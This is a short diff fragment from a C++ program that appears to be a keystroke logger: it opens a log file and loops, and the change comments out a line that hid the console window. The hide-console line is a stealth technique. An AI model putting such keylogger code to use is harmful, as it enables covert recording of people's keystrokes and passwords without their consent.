@@ -15,7 +15,7 @@ int main(void) {
     fileStream.open("keyboard-keystroke-logger.log", std::ios::binary | std::ios::out);
 
     // ...
-    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    // ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
     // Loop
     while (true) {
